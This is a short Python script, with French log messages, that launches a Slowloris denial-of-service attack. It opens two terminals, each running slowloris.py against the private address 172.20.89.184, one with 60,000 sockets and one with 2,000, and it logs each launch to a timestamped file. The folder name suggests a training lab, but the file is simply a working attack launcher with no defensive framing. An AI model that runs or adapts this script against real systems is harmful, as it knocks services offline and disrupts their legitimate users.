import subprocess
import datetime
import os

log_dir = os.path.expanduser("~/ihm_cydops/attaque/logs")
os.makedirs(log_dir, exist_ok=True)

timestamp = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
log_file = os.path.join(log_dir, f"ddos_slowloris_{timestamp}.txt")
target = "172.20.89.184"

with open(log_file, "w") as f:
    f.write("Début de l'attaque Slowloris\n")
    f.write(f"Date : {datetime.datetime.now()}\n")
    f.write(f"Cible : {target}\n\n")

    cmd1 = f"python3 slowloris.py -s 60000 {target}"
    cmd2 = f"python3 slowloris.py -s 2000 {target}"

    subprocess.Popen(["xfce4-terminal", "--hold", "--command", cmd1])
    f.write(f"[✔] Commande 1 lancée : {cmd1}\n")

    subprocess.Popen(["xfce4-terminal", "--hold", "--command", cmd2])
    f.write(f"[✔] Commande 2 lancée : {cmd2}\n")

    f.write("\n[+] Les deux terminaux ont été lancés.\n")

